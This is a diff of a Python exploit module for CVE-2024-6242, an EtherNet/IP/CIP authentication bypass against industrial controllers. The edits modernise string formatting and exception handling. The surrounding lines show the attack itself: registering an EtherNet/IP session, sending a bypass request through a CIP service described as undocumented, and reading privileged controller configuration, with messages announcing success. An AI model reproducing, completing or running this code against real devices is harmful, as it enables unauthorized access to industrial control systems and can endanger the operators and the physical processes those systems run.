@@ -88,7 +88,7 @@ class Exploit(Exploit):
             print_info("Reference: https://nvd.nist.gov/vuln/detail/CVE-2024-6242")
             return
 
-        print_status("[CVE-2024-6242] Targeting {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2024-6242] Targeting {self.target}:{self.port} ...")
 
         # Phase 1: RegisterSession
         EIP_REGISTER = struct.pack("<HHIIQIH", 0x0065, 4, 0, 0, 0, 0) + struct.pack("<HH", 1, 0)
@@ -103,9 +103,9 @@ class Exploit(Exploit):
                 sock.close()
                 return
             session_handle = struct.unpack_from("<I", resp, 4)[0]
-            print_success("[CVE-2024-6242] EtherNet/IP session: 0x{:08X}".format(session_handle))
+            print_success(f"[CVE-2024-6242] EtherNet/IP session: 0x{session_handle:08X}")
         except Exception as exc:
-            print_error("[CVE-2024-6242] Connection failed: {}".format(exc))
+            print_error(f"[CVE-2024-6242] Connection failed: {exc}")
             return
 
         # Phase 2: Auth bypass via undocumented CIP service 0x4E
@@ -136,7 +136,7 @@ class Exploit(Exploit):
             time.sleep(0.3)
             try:
                 return sock.recv(512)
-            except socket.timeout:
+            except TimeoutError:
                 return b""
 
         try:
@@ -144,7 +144,7 @@ class Exploit(Exploit):
             rsp_bypass = send_cip(cip_bypass)
             if rsp_bypass:
                 cip_status = struct.unpack_from("<B", rsp_bypass, -1)[0] if rsp_bypass else 0xFF
-                print_success("[CVE-2024-6242] Auth bypass response received ({} bytes)".format(len(rsp_bypass)))
+                print_success(f"[CVE-2024-6242] Auth bypass response received ({len(rsp_bypass)} bytes)")
             else:
                 print_warning("[CVE-2024-6242] No response to bypass — device may require specific firmware version")
 
@@ -152,12 +152,12 @@ class Exploit(Exploit):
             rsp_read = send_cip(cip_read_config)
             if rsp_read and len(rsp_read) > 24:
                 print_success("[CVE-2024-6242] READ SUCCESS — Auth bypass confirmed, privileged data accessible")
-                print_info("Response length: {} bytes (identity/config data)".format(len(rsp_read)))
+                print_info(f"Response length: {len(rsp_read)} bytes (identity/config data)")
             else:
-                print_info("[CVE-2024-6242] Read response: {} bytes (may need session follow-up)".format(len(rsp_read)))
+                print_info(f"[CVE-2024-6242] Read response: {len(rsp_read)} bytes (may need session follow-up)")
 
         except Exception as exc:
-            print_error("[CVE-2024-6242] Exploit error: {}".format(exc))
+            print_error(f"[CVE-2024-6242] Exploit error: {exc}")
         finally:
             try:
                 sock.close()
